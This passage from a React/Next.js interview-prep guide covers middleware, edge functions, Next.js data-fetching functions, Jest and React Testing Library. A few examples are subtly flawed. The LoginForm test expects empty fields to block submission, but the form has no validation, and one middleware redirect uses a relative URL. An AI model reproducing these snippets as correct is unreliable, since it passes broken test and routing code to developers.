  const backend = routes[pathname];
  
  if (!backend) {
    return new Response('Not Found', { status: 404 });
  }
  
  // Proxy request to backend
  return fetch(`${backend}${pathname}`, {
    method: request.method,
    headers: request.headers,
    body: request.body,
  });
}

Middleware vs Edge Functions:
------------------------------

// Middleware:
// - Runs before rendering
// - Can redirect/rewrite
// - Access to cookies, headers
// - Runs for pages and API routes

// Edge Functions:
// - API route at edge
// - Returns response directly
// - Lower latency
// - Globally distributed

// Example: Combine both
// middleware.js
export function middleware(request) {
  // Check auth before edge function
  if (!request.cookies.get('token')) {
    return NextResponse.redirect('/login');
  }
  return NextResponse.next();
}

export const config = {
  matcher: '/api/protected/:path*',
};

// pages/api/protected/data.js
export const config = { runtime: 'edge' };

export default async function handler(request) {
  // This runs at edge after middleware check
  const data = await fetchDataFromEdge();
  return new Response(JSON.stringify(data));
}

Real-World Example:
-------------------

// Internationalization with middleware

// middleware.js
import { NextResponse } from 'next/server';

const locales = ['en', 'es', 'fr', 'de'];
const defaultLocale = 'en';

function getLocale(request) {
  // Check cookie
  const localeCookie = request.cookies.get('locale');
  if (localeCookie && locales.includes(localeCookie)) {
    return localeCookie;
  }
  
  // Check Accept-Language header
  const acceptLanguage = request.headers.get('accept-language');
  if (acceptLanguage) {
    for (const locale of locales) {
      if (acceptLanguage.includes(locale)) {
        return locale;
      }
    }
  }
  
  return defaultLocale;
}

export function middleware(request) {
  const { pathname } = request.nextUrl;
  
  // Check if pathname already has locale
  const pathnameHasLocale = locales.some(
    locale => pathname.startsWith(`/${locale}/`) || pathname === `/${locale}`
  );
  
  if (pathnameHasLocale) return NextResponse.next();
  
  // Get user's preferred locale
  const locale = getLocale(request);
  
  // Redirect to locale-specific URL
  const newUrl = new URL(`/${locale}${pathname}`, request.url);
  return NextResponse.redirect(newUrl);
}

export const config = {
  matcher: ['/((?!api|_next|favicon.ico).*)'],
};

Summary:

Middleware:
- Runs before request completed
- Redirect, rewrite, modify headers
- Authentication, authorization
- A/B testing, feature flags
- Geolocation-based routing
- Rate limiting
- Defined in middleware.js

Edge Functions:
- API routes at edge locations
- Low latency (~50ms)
- Global distribution
- No cold starts
- Use runtime: 'edge'
- Limited APIs (edge-compatible only)
*/


/**
90. What is getStaticProps, getServerSideProps, and getStaticPaths?
-------------------------------------------------------------------

These are special Next.js functions for data fetching that enable SSR, SSG, and ISR.
They run on the server (never on client) and determine how pages are rendered.

1. getStaticProps:
------------------

// Static Site Generation (SSG)
// Runs at build time
// Generates static HTML

// Basic example:
export async function getStaticProps() {
  // Fetch data at build time
  const posts = await fetchPosts();
  
  return {
    props: {
      posts,  // Will be passed to page component as props
    },
  };
}

export default function Blog({ posts }) {
  return (
    <div>
      {posts.map(post => (
        <article key={post.id}>
          <h2>{post.title}</h2>
        </article>
      ))}
    </div>
  );
}

// When Next.js builds:
// 1. Calls getStaticProps
// 2. Fetches posts
// 3. Renders Blog component with posts
// 4. Generates blog.html
// 5. Serves static HTML (blazing fast!)

// With ISR (Incremental Static Regeneration):
export async function getStaticProps() {
  const posts = await fetchPosts();
  
  return {
    props: { posts },
    revalidate: 60,  // Regenerate every 60 seconds
  };
}

// Now pages rebuild periodically with fresh data!

// Context object:
export async function getStaticProps(context) {
  const {
    params,       // Route parameters (for dynamic routes)
    preview,      // True if in preview mode
    previewData,  // Preview data
    locale,       // Current locale (i18n)
    locales,      // All locales (i18n)
    defaultLocale, // Default locale (i18n)
  } = context;
  
  return { props: {} };
}

// Return options:
export async function getStaticProps() {
  return {
    props: { data },        // Props for component
    revalidate: 60,         // ISR: rebuild every 60s
    notFound: true,         // Show 404 page
    redirect: {             // Redirect to another page
      destination: '/other',
      permanent: false,
    },
  };
}

2. getServerSideProps:
----------------------

// Server-Side Rendering (SSR)
// Runs on every request
// Fresh data every time

// Basic example:
export async function getServerSideProps() {
  // Runs on every request
  const data = await fetchFreshData();
  
  return {
    props: { data },
  };
}

export default function Dashboard({ data }) {
  return <div>{data.value}</div>;
}

// Request flow:
// 1. User requests /dashboard
// 2. Server runs getServerSideProps
// 3. Server fetches data
// 4. Server renders component with data
// 5. Server sends HTML to client
// 6. React hydrates on client

// Context object:
export async function getServerSideProps(context) {
  const {
    params,       // Route parameters
    req,          // HTTP request object
    res,          // HTTP response object
    query,        // Query string
    preview,      // Preview mode
    previewData,  // Preview data
    resolvedUrl,  // Resolved URL
    locale,       // Current locale
    locales,      // All locales
    defaultLocale, // Default locale
  } = context;
  
  // Access cookies
  const token = req.cookies.token;
  
  // Access headers
  const userAgent = req.headers['user-agent'];
  
  // Set headers
  res.setHeader('Cache-Control', 'public, s-maxage=10');
  
  return { props: {} };
}

// Authentication example:
export async function getServerSideProps({ req, res }) {
  const session = await getSession(req);
  
  // Not authenticated
  if (!session) {
    return {
      redirect: {
        destination: '/login',
        permanent: false,
      },
    };
  }
  
  // Fetch user-specific data
  const userData = await fetchUserData(session.user.id);
  
  return {
    props: {
      user: session.user,
      userData,
    },
  };
}

// Return options:
export async function getServerSideProps() {
  return {
    props: { data },        // Props for component
    notFound: true,         // Show 404 page
    redirect: {             // Redirect
      destination: '/other',
      permanent: false,
    },
  };
}

3. getStaticPaths:
------------------

// Required for dynamic routes with getStaticProps
// Tells Next.js which paths to pre-render

// pages/posts/[id].js
export async function getStaticPaths() {
  // Get list of all post IDs
  const posts = await fetchAllPosts();
  
  // Generate paths
  const paths = posts.map(post => ({
    params: { id: post.id.toString() }
  }));
  
  return {
    paths,           // Paths to pre-render
    fallback: false, // false, true, or 'blocking'
  };
}

export async function getStaticProps({ params }) {
  // Fetch data for specific post
  const post = await fetchPost(params.id);
  
  return {
    props: { post },
  };
}

export default function Post({ post }) {
  return (
    <article>
      <h1>{post.title}</h1>
      <p>{post.content}</p>
    </article>
  );
}

// Build output:
// - Calls getStaticPaths → gets all IDs
// - For each ID, calls getStaticProps
// - Generates HTML for each post
// - /posts/1.html
// - /posts/2.html
// - /posts/3.html

// Fallback Options:

// fallback: false
// - Only paths from getStaticPaths pre-rendered
// - 404 for other paths
export async function getStaticPaths() {
  return {
    paths: [
      { params: { id: '1' } },
      { params: { id: '2' } },
    ],
    fallback: false,  // /posts/3 → 404
  };
}

// fallback: true
// - Paths not pre-rendered generated on first request
// - Shows loading/fallback UI while generating
export async function getStaticPaths() {
  // Only pre-render most popular posts
  const popularPosts = await fetchPopularPosts();
  
  const paths = popularPosts.map(post => ({
    params: { id: post.id.toString() }
  }));
  
  return {
    paths,
    fallback: true,  // Other posts generated on-demand
  };
}

export default function Post({ post }) {
  const router = useRouter();
  
  // Show loading while generating
  if (router.isFallback) {
    return <div>Loading...</div>;
  }
  
  return <article>{post.title}</article>;
}

// fallback: 'blocking'
// - Like true, but waits for generation
// - No loading state shown, just waits
export async function getStaticPaths() {
  return {
    paths: [],
    fallback: 'blocking',  // All posts generated on-demand
  };
}

// No need for isFallback check
export default function Post({ post }) {
  return <article>{post.title}</article>;
}

Complete Examples:
------------------

// Example 1: Blog with pagination

// pages/blog/page/[page].js
export async function getStaticPaths() {
  const totalPosts = await getTotalPosts();
  const postsPerPage = 10;
  const totalPages = Math.ceil(totalPosts / postsPerPage);
  
  const paths = Array.from({ length: totalPages }, (_, i) => ({
    params: { page: (i + 1).toString() }
  }));
  
  return { paths, fallback: false };
}

export async function getStaticProps({ params }) {
  const page = parseInt(params.page);
  const postsPerPage = 10;
  
  const posts = await fetchPosts({
    skip: (page - 1) * postsPerPage,
    limit: postsPerPage
  });
  
  const totalPosts = await getTotalPosts();
  
  return {
    props: {
      posts,
      currentPage: page,
      totalPages: Math.ceil(totalPosts / postsPerPage),
    },
    revalidate: 3600,  // Rebuild every hour
  };
}

export default function BlogPage({ posts, currentPage, totalPages }) {
  return (
    <div>
      {posts.map(post => <Post key={post.id} {...post} />)}
      
      <div>
        {currentPage > 1 && (
          <Link href={`/blog/page/${currentPage - 1}`}>
            <a>Previous</a>
          </Link>
        )}
        {currentPage < totalPages && (
          <Link href={`/blog/page/${currentPage + 1}`}>
            <a>Next</a>
          </Link>
        )}
      </div>
    </div>
  );
}

// Example 2: User profile with authentication

// pages/users/[id].js
export async function getServerSideProps({ params, req }) {
  const session = await getSession(req);
  
  // Check if user is viewing their own profile
  const isOwnProfile = session?.user?.id === params.id;
  
  // Get public or private data based on auth
  const user = await fetchUser(params.id, { 
    includePrivate: isOwnProfile 
  });
  
  if (!user) {
    return { notFound: true };
  }
  
  return {
    props: {
      user,
      isOwnProfile,
      viewerSession: session,
    },
  };
}

export default function UserProfile({ user, isOwnProfile }) {
  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.bio}</p>
      
      {isOwnProfile && (
        <div>
          <p>Email: {user.email}</p>  {/* Private info * /}
          <Link href="/settings"><a>Edit Profile</a></Link>
        </div>
      )}
    </div>
  );
}

// Example 3: Multi-level dynamic routes

// pages/[category]/[subcategory]/[product].js
export async function getStaticPaths() {
  const categories = await fetchCategories();
  const paths = [];
  
  for (const category of categories) {
    const subcategories = await fetchSubcategories(category.id);
    
    for (const subcategory of subcategories) {
      const products = await fetchProducts(subcategory.id);
      
      for (const product of products) {
        paths.push({
          params: {
            category: category.slug,
            subcategory: subcategory.slug,
            product: product.slug
          }
        });
      }
    }
  }
  
  return {
    paths,
    fallback: 'blocking',  // Generate new products on-demand
  };
}

export async function getStaticProps({ params }) {
  const product = await fetchProduct({
    category: params.category,
    subcategory: params.subcategory,
    slug: params.product
  });
  
  if (!product) {
    return { notFound: true };
  }
  
  return {
    props: { product },
    revalidate: 300,  // 5 minutes
  };
}

Comparison:
-----------

// getStaticProps:
// ✅ Runs at build time
// ✅ Pre-renders static HTML
// ✅ Fastest (served from CDN)
// ✅ Perfect SEO
// ❌ Data can be stale
// Use for: Blogs, marketing pages, docs

// getServerSideProps:
// ✅ Runs on every request
// ✅ Always fresh data
// ✅ User-specific content
// ✅ Access to request/response
// ❌ Slower (server renders each request)
// ❌ Can't cache on CDN
// Use for: Dashboards, profiles, real-time data

// getStaticPaths:
// ✅ Defines which dynamic paths to pre-render
// ✅ Works with getStaticProps
// ✅ Fallback options for flexibility
// Use for: Dynamic routes with SSG

Summary:

getStaticProps:
- Build-time data fetching
- Generates static HTML
- Optional ISR with revalidate
- Perfect for content sites

getServerSideProps:
- Request-time data fetching
- Server renders on every request
- Access to request context
- For personalized/real-time content

getStaticPaths:
- Define dynamic routes for SSG
- Works with getStaticProps
- Fallback options for on-demand generation
- For dynamic routes

All run server-side only
Never in client bundle
Enable SSR, SSG, and ISR
*/




/**
91. What is Jest and how is it used in React?
--------------------------------------------

Jest is a JavaScript testing framework developed by Facebook, designed to work
seamlessly with React. It provides a complete testing solution with test runner,
assertion library, mocking capabilities, and code coverage out of the box.

What is Jest:
-------------

// Jest provides:
// - Test runner (executes tests)
// - Assertion library (expect API)
// - Mocking (functions, modules, timers)
// - Code coverage reports
// - Snapshot testing
// - Built-in with Create React App

Installation:
-------------

// If using Create React App:
// Jest is already configured!

// Manual installation:
npm install --save-dev jest @testing-library/react @testing-library/jest-dom

// package.json
{
  "scripts": {
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage"
  }
}

Basic Jest Test Structure:
---------------------------

// sum.js
export function sum(a, b) {
  return a + b;
}

// sum.test.js
import { sum } from './sum';

// Test suite
describe('sum function', () => {
  // Individual test
  test('adds 1 + 2 to equal 3', () => {
    expect(sum(1, 2)).toBe(3);
  });
  
  test('adds -1 + 1 to equal 0', () => {
    expect(sum(-1, 1)).toBe(0);
  });
});

// Run tests:
npm test

Jest Matchers:
--------------

// Equality
expect(value).toBe(5);                    // Strict equality (===)
expect(value).toEqual({ name: 'John' }); // Deep equality
expect(value).not.toBe(10);              // Negation

// Truthiness
expect(value).toBeTruthy();
expect(value).toBeFalsy();
expect(value).toBeNull();
expect(value).toBeUndefined();
expect(value).toBeDefined();

// Numbers
expect(value).toBeGreaterThan(3);
expect(value).toBeGreaterThanOrEqual(3.5);
expect(value).toBeLessThan(5);
expect(value).toBeLessThanOrEqual(4.5);
expect(value).toBeCloseTo(0.3); // Floating point

// Strings
expect(string).toMatch(/pattern/);
expect(string).toContain('substring');

// Arrays and iterables
expect(array).toContain(item);
expect(array).toHaveLength(3);
expect(array).toContainEqual({ id: 1 });

// Objects
expect(obj).toHaveProperty('name');
expect(obj).toHaveProperty('name', 'John');
expect(obj).toMatchObject({ name: 'John' });

// Exceptions
expect(() => func()).toThrow();
expect(() => func()).toThrow(Error);
expect(() => func()).toThrow('error message');

Testing React Components:
--------------------------

// Button.jsx
export function Button({ onClick, children, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled}>
      {children}
    </button>
  );
}

// Button.test.js
import { render, screen, fireEvent } from '@testing-library/react';
import { Button } from './Button';

describe('Button component', () => {
  test('renders with text', () => {
    render(<Button>Click me</Button>);
    
    const button = screen.getByText('Click me');
    expect(button).toBeInTheDocument();
  });
  
  test('calls onClick when clicked', () => {
    const handleClick = jest.fn(); // Mock function
    render(<Button onClick={handleClick}>Click me</Button>);
    
    const button = screen.getByText('Click me');
    fireEvent.click(button);
    
    expect(handleClick).toHaveBeenCalledTimes(1);
  });
  
  test('is disabled when disabled prop is true', () => {
    render(<Button disabled>Click me</Button>);
    
    const button = screen.getByText('Click me');
    expect(button).toBeDisabled();
  });
});

Testing Async Code:
-------------------

// UserProfile.jsx
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    fetchUser(userId)
      .then(data => {
        setUser(data);
        setLoading(false);
      })
      .catch(err => {
        setError(err.message);
        setLoading(false);
      });
  }, [userId]);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  if (!user) return <div>No user found</div>;
  
  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.email}</p>
    </div>
  );
}

// UserProfile.test.js
import { render, screen, waitFor } from '@testing-library/react';
import { UserProfile } from './UserProfile';
import { fetchUser } from './api';

// Mock the API module
jest.mock('./api');

describe('UserProfile component', () => {
  test('shows loading state initially', () => {
    fetchUser.mockImplementation(() => new Promise(() => {})); // Never resolves
    
    render(<UserProfile userId="123" />);
    
    expect(screen.getByText('Loading...')).toBeInTheDocument();
  });
  
  test('displays user data when loaded', async () => {
    const mockUser = {
      name: 'John Doe',
      email: 'john@example.com'
    };
    
    fetchUser.mockResolvedValue(mockUser);
    
    render(<UserProfile userId="123" />);
    
    // Wait for user data to appear
    await waitFor(() => {
      expect(screen.getByText('John Doe')).toBeInTheDocument();
    });
    
    expect(screen.getByText('john@example.com')).toBeInTheDocument();
  });
  
  test('displays error message when fetch fails', async () => {
    fetchUser.mockRejectedValue(new Error('Failed to fetch'));
    
    render(<UserProfile userId="123" />);
    
    await waitFor(() => {
      expect(screen.getByText('Error: Failed to fetch')).toBeInTheDocument();
    });
  });
});

Mocking in Jest:
----------------

// 1. Mock Functions
const mockFn = jest.fn();
mockFn('arg1', 'arg2');

expect(mockFn).toHaveBeenCalled();
expect(mockFn).toHaveBeenCalledTimes(1);
expect(mockFn).toHaveBeenCalledWith('arg1', 'arg2');
expect(mockFn).toHaveBeenLastCalledWith('arg1', 'arg2');

// Mock return values
mockFn.mockReturnValue(42);
mockFn.mockReturnValueOnce(1).mockReturnValueOnce(2);

// Mock implementations
mockFn.mockImplementation((a, b) => a + b);
mockFn.mockImplementationOnce(() => 'first call');

// 2. Mock Modules
// api.js
export const fetchData = () => fetch('/api/data');

// component.test.js
import { fetchData } from './api';

jest.mock('./api');

test('fetches data', async () => {
  fetchData.mockResolvedValue({ data: 'test' });
  
  // Test code using fetchData
  const result = await fetchData();
  expect(result).toEqual({ data: 'test' });
});

// 3. Partial Module Mocking
jest.mock('./utils', () => ({
  ...jest.requireActual('./utils'), // Keep original exports
  specificFunction: jest.fn()       // Mock only this one
}));

// 4. Mock Timers
jest.useFakeTimers();

test('calls callback after delay', () => {
  const callback = jest.fn();
  
  setTimeout(callback, 1000);
  
  // Fast-forward time
  jest.advanceTimersByTime(1000);
  
  expect(callback).toHaveBeenCalled();
});

// 5. Mock Date
const mockDate = new Date('2024-01-01');
jest.spyOn(global, 'Date').mockImplementation(() => mockDate);

Setup and Teardown:
-------------------

describe('Test suite', () => {
  // Runs once before all tests
  beforeAll(() => {
    console.log('Setup before all tests');
  });
  
  // Runs before each test
  beforeEach(() => {
    console.log('Setup before each test');
  });
  
  // Runs after each test
  afterEach(() => {
    console.log('Cleanup after each test');
    jest.clearAllMocks(); // Clear mock data
  });
  
  // Runs once after all tests
  afterAll(() => {
    console.log('Cleanup after all tests');
  });
  
  test('test 1', () => {
    expect(true).toBe(true);
  });
  
  test('test 2', () => {
    expect(false).toBe(false);
  });
});

Testing Forms:
--------------

// LoginForm.jsx
function LoginForm({ onSubmit }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit({ email, password });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        placeholder="Email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <button type="submit">Login</button>
    </form>
  );
}

// LoginForm.test.js
import { render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { LoginForm } from './LoginForm';

describe('LoginForm', () => {
  test('submits form with email and password', async () => {
    const handleSubmit = jest.fn();
    render(<LoginForm onSubmit={handleSubmit} />);
    
    // Get form elements
    const emailInput = screen.getByPlaceholderText('Email');
    const passwordInput = screen.getByPlaceholderText('Password');
    const submitButton = screen.getByText('Login');
    
    // Type into inputs (userEvent is more realistic than fireEvent)
    await userEvent.type(emailInput, 'test@example.com');
    await userEvent.type(passwordInput, 'password123');
    
    // Submit form
    fireEvent.click(submitButton);
    
    // Verify submission
    expect(handleSubmit).toHaveBeenCalledWith({
      email: 'test@example.com',
      password: 'password123'
    });
  });
  
  test('does not submit with empty fields', () => {
    const handleSubmit = jest.fn();
    render(<LoginForm onSubmit={handleSubmit} />);
    
    const submitButton = screen.getByText('Login');
    fireEvent.click(submitButton);
    
    // Form validation should prevent submission
    expect(handleSubmit).not.toHaveBeenCalled();
  });
});

Testing Hooks:
--------------

// useCounter.js
export function useCounter(initialValue = 0) {
  const [count, setCount] = useState(initialValue);
  
  const increment = () => setCount(c => c + 1);
  const decrement = () => setCount(c => c - 1);
  const reset = () => setCount(initialValue);
  
  return { count, increment, decrement, reset };
}

// useCounter.test.js
import { renderHook, act } from '@testing-library/react';
import { useCounter } from './useCounter';

describe('useCounter hook', () => {
  test('initializes with default value', () => {
    const { result } = renderHook(() => useCounter());
    
    expect(result.current.count).toBe(0);
  });
  
  test('initializes with custom value', () => {
    const { result } = renderHook(() => useCounter(10));
    
    expect(result.current.count).toBe(10);
  });
  
  test('increments count', () => {
    const { result } = renderHook(() => useCounter());
    
    act(() => {
      result.current.increment();
    });
    
    expect(result.current.count).toBe(1);
  });
  
  test('decrements count', () => {
    const { result } = renderHook(() => useCounter(5));
    
    act(() => {
      result.current.decrement();
    });
    
    expect(result.current.count).toBe(4);
  });
  
  test('resets count', () => {
    const { result } = renderHook(() => useCounter(10));
    
    act(() => {
      result.current.increment();
      result.current.increment();
    });
    
    expect(result.current.count).toBe(12);
    
    act(() => {
      result.current.reset();
    });
    
    expect(result.current.count).toBe(10);
  });
});

Testing with Context:
---------------------

// ThemeContext.jsx
const ThemeContext = createContext();

export function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');
  
  return (
    <ThemeContext.Provider value={{ theme, setTheme }}>
      {children}
    </ThemeContext.Provider>
  );
}

export const useTheme = () => useContext(ThemeContext);

// ThemedButton.jsx
function ThemedButton() {
  const { theme, setTheme } = useTheme();
  
  return (
    <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>
      Current theme: {theme}
    </button>
  );
}

// ThemedButton.test.js
import { render, screen, fireEvent } from '@testing-library/react';
import { ThemeProvider } from './ThemeContext';
import { ThemedButton } from './ThemedButton';

describe('ThemedButton', () => {
  test('displays current theme', () => {
    render(
      <ThemeProvider>
        <ThemedButton />
      </ThemeProvider>
    );
    
    expect(screen.getByText('Current theme: light')).toBeInTheDocument();
  });
  
  test('toggles theme when clicked', () => {
    render(
      <ThemeProvider>
        <ThemedButton />
      </ThemeProvider>
    );
    
    const button = screen.getByText('Current theme: light');
    
    fireEvent.click(button);
    expect(screen.getByText('Current theme: dark')).toBeInTheDocument();
    
    fireEvent.click(button);
    expect(screen.getByText('Current theme: light')).toBeInTheDocument();
  });
});

Code Coverage:
--------------

// Run tests with coverage
npm test -- --coverage

// Coverage report:
// --------------------|---------|----------|---------|---------|-------------------
// File                | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s
// --------------------|---------|----------|---------|---------|-------------------
// All files           |   85.71 |       75 |      80 |   85.71 |
//  Button.jsx         |     100 |      100 |     100 |     100 |
//  Counter.jsx        |      80 |       50 |      75 |      80 | 15-17
// --------------------|---------|----------|---------|---------|-------------------

// Configure coverage thresholds
// jest.config.js
module.exports = {
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  }
};

Jest Configuration:
-------------------

// jest.config.js
module.exports = {
  // Test environment
  testEnvironment: 'jsdom', // or 'node'
  
  // Setup files
  setupFilesAfterEnv: ['<rootDir>/jest.setup.js'],
  
  // Module paths
  moduleNameMapper: {
    '\\.(css|less|scss)$': 'identity-obj-proxy',
    '\\.(jpg|jpeg|png|gif|svg)$': '<rootDir>/__mocks__/fileMock.js'
  },
  
  // Coverage
  collectCoverageFrom: [
    'src/** /*.{js,jsx}',
    '!src/index.js',
    '!src/** /*.test.js'
  ],
  
  // Transform
  transform: {
    '^.+\\.(js|jsx)$': 'babel-jest'
  }
};

// jest.setup.js
import '@testing-library/jest-dom';

Best Practices:
---------------

// 1. Test behavior, not implementation
// ❌ Bad
test('has state initialized to 0', () => {
  const wrapper = shallow(<Counter />);
  expect(wrapper.state('count')).toBe(0);
});

// ✅ Good
test('displays initial count of 0', () => {
  render(<Counter />);
  expect(screen.getByText('Count: 0')).toBeInTheDocument();
});

// 2. Use realistic user interactions
// ❌ Bad
fireEvent.change(input, { target: { value: 'test' } });

// ✅ Good
await userEvent.type(input, 'test');

// 3. Query by accessible attributes
// ❌ Bad
screen.getByTestId('submit-button');

// ✅ Good
screen.getByRole('button', { name: /submit/i });
screen.getByLabelText('Email');

// 4. Don't test implementation details
// ❌ Bad - Testing internal state
expect(component.state.isOpen).toBe(true);

// ✅ Good - Testing visible behavior
expect(screen.getByText('Modal content')).toBeVisible();

// 5. Keep tests isolated
// ❌ Bad - Tests depend on each other
let user;
test('creates user', () => {
  user = createUser();
});
test('updates user', () => {
  updateUser(user); // Depends on previous test!
});

// ✅ Good - Independent tests
test('creates user', () => {
  const user = createUser();
  expect(user).toBeDefined();
});
test('updates user', () => {
  const user = createUser(); // Create fresh user
  updateUser(user);
  expect(user.updated).toBe(true);
});

Summary:

Jest for React:
- Complete testing framework
- Built-in with Create React App
- Test runner + assertions + mocking
- Works seamlessly with React Testing Library
- Mock functions, modules, timers
- Code coverage reports
- Snapshot testing support
- Fast and parallel test execution
- Watch mode for development
*/


/**
92. What is React Testing Library (RTL)?
----------------------------------------

React Testing Library is a lightweight testing library that encourages testing
components the way users interact with them. It focuses on testing behavior
rather than implementation details.

Philosophy:
-----------

// "The more your tests resemble the way your software is used,
//  the more confidence they can give you."

// RTL encourages:
// ✅ Testing what users see and do
// ✅ Testing accessibility
// ✅ Testing behavior, not implementation
// ❌ Avoiding testing internal state
// ❌ Avoiding testing implementation details

Installation:
-------------

npm install --save-dev @testing-library/react @testing-library/jest-dom @testing-library/user-event

// jest.setup.js
import '@testing-library/jest-dom';

Core API - Queries:
-------------------

import { render, screen } from '@testing-library/react';

// Priority order for queries:
// 1. Accessible to everyone (including assistive technology)
// 2. Semantic queries
// 3. Test IDs (last resort)

// 1. getByRole (BEST - accessibility focused)
screen.getByRole('button');
screen.getByRole('button', { name: /submit/i });
screen.getByRole('textbox', { name: /email/i });
screen.getByRole('heading', { level: 1 });

// Common roles:
// - button
// - link
// - textbox (input, textarea)
// - checkbox
// - radio
// - combobox (select)
// - heading
// - img
// - dialog
// - alert

// 2. getByLabelText (forms)
screen.getByLabelText('Email');
screen.getByLabelText(/password/i);

// 3. getByPlaceholderText (inputs)
screen.getByPlaceholderText('Enter email');

// 4. getByText (text content)
screen.getByText('Hello World');
screen.getByText(/hello/i); // Case insensitive regex

// 5. getByDisplayValue (form inputs with value)
screen.getByDisplayValue('Current value');

// 6. getByAltText (images)
screen.getByAltText('Profile picture');

// 7. getByTitle (title attribute)
screen.getByTitle('Close');

// 8. getByTestId (LAST RESORT)
screen.getByTestId('custom-element');
// Use data-testid attribute: <div data-testid="custom-element" />

Query Variants:
---------------

// getBy - Throws error if not found (single element)
const button = screen.getByRole('button');

// queryBy - Returns null if not found (single element)
const button = screen.queryByRole('button');
expect(button).toBeNull(); // For checking absence

// findBy - Returns promise, waits for element (single element)
const button = await screen.findByRole('button');

// getAllBy - Returns array, throws if none found (multiple elements)
const buttons = screen.getAllByRole('button');

// queryAllBy - Returns empty array if none found (multiple elements)
const buttons = screen.queryAllByRole('button');

// findAllBy - Returns promise for array (multiple elements)
const buttons = await screen.findAllByRole('button');

// Use cases:
// - getBy: Element should be present
// - queryBy: Check element is NOT present
// - findBy: Element appears asynchronously

Rendering Components:
---------------------

import { render, screen } from '@testing-library/react';

// Basic render
render(<Button>Click me</Button>);

// Render with props
render(<UserProfile userId="123" />);

// Render returns utilities
const { container, rerender, unmount, debug } = render(<App />);

// container: DOM node
console.log(container.innerHTML);

// rerender: Update props
rerender(<App count={1} />);
rerender(<App count={2} />);

// unmount: Remove component
unmount();

// debug: Print DOM tree
debug(); // Prints entire tree
debug(screen.getByRole('button')); // Prints specific element

User Interactions:
------------------

import userEvent from '@testing-library/user-event';

// userEvent is more realistic than fireEvent
// It simulates real user interactions

describe('User interactions', () => {
  test('clicking button', async () => {
    const user = userEvent.setup();
    render(<Button onClick={handleClick}>Click me</Button>);
    
    await user.click(screen.getByRole('button'));
    
    expect(handleClick).toHaveBeenCalled();
  });
  
  test('typing in input', async () => {
    const user = userEvent.setup();
    render(<input />);
    
    const input = screen.getByRole('textbox');
    await user.type(input, 'Hello');
    
    expect(input).toHaveValue('Hello');
  });
  
  test('clearing input', async () => {
    const user = userEvent.setup();
    render(<input defaultValue="initial" />);
    
    const input = screen.getByRole('textbox');
    await user.clear(input);
    
    expect(input).toHaveValue('');
  });
  
  test('selecting option', async () => {
    const user = userEvent.setup();
    render(
      <select>
        <option value="1">Option 1</option>
        <option value="2">Option 2</option>
      </select>
    );
    
    await user.selectOptions(screen.getByRole('combobox'), '2');
    
    expect(screen.getByRole('option', { name: 'Option 2' })).toBeSelected();
  });
  
  test('checking checkbox', async () => {
    const user = userEvent.setup();
    render(<input type="checkbox" />);
    
    const checkbox = screen.getByRole('checkbox');
    await user.click(checkbox);
    
    expect(checkbox).toBeChecked();
  });
  
  test('hovering element', async () => {
    const user = userEvent.setup();
    render(<button>Hover me</button>);
    
    await user.hover(screen.getByRole('button'));
    // Check for hover effects
  });
  
  test('keyboard navigation', async () => {
    const user = userEvent.setup();
    render(<input />);
    
    const input = screen.getByRole('textbox');
    await user.tab(); // Tab to input
    await user.keyboard('Hello'); // Type
    
    expect(input).toHaveValue('Hello');
  });
});

Async Testing:
--------------

import { render, screen, waitFor } from '@testing-library/react';

// 1. Using findBy (recommended for simple cases)
test('displays user data', async () => {
  render(<UserProfile userId="123" />);
  
  // findBy waits for element to appear
  const name = await screen.findByText('John Doe');
  expect(name).toBeInTheDocument();
});

// 2. Using waitFor (complex assertions)
test('loads and displays data', async () => {
  render(<DataComponent />);
  
  await waitFor(() => {
    expect(screen.getByText('Data loaded')).toBeInTheDocument();
  });
  
  // Can also check multiple things
  await waitFor(() => {
    expect(screen.getByText('Item 1')).toBeInTheDocument();
    expect(screen.getByText('Item 2')).toBeInTheDocument();
  });
});

// 3. Using waitForElementToBeRemoved
test('removes loading spinner', async () => {
  render(<Component />);
  
  const spinner = screen.getByText('Loading...');
  
  await waitForElementToBeRemoved(() => screen.queryByText('Loading...'));
  
  expect(screen.queryByText('Loading...')).not.toBeInTheDocument();
});

// Configure timeout
await waitFor(() => {
  expect(screen.getByText('Loaded')).toBeInTheDocument();
}, { timeout: 3000 }); // Wait up to 3 seconds

Custom Matchers:
----------------

// @testing-library/jest-dom provides custom matchers

// Visibility
expect(element).toBeVisible();
expect(element).not.toBeVisible();

// Presence
expect(element).toBeInTheDocument();
expect(element).not.toBeInTheDocument();

// Content
expect(element).toHaveTextContent('Hello');
expect(element).toHaveTextContent(/hello/i);

// Attributes
expect(element).toHaveAttribute('href', '/about');
expect(element).toHaveClass('active');

// Forms
expect(input).toHaveValue('text');
expect(input).toHaveDisplayValue('text');
expect(checkbox).toBeChecked();
expect(checkbox).not.toBeChecked();
expect(input).toBeDisabled();
expect(input).toBeEnabled();
expect(input).toBeRequired();
expect(input).toHaveFormValues({ email: 'test@example.com' });

// Focus
expect(element).toHaveFocus();

// Style
expect(element).toHaveStyle('display: none');
expect(element).toHaveStyle({ color: 'red', fontSize: '16px' });

Testing Examples:
-----------------

// Example 1: Counter component
function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
      <button onClick={() => setCount(count - 1)}>Decrement</button>
      <button onClick={() => setCount(0)}>Reset</button>
    </div>
  );
}

test('increments count', async () => {
  const user = userEvent.setup();
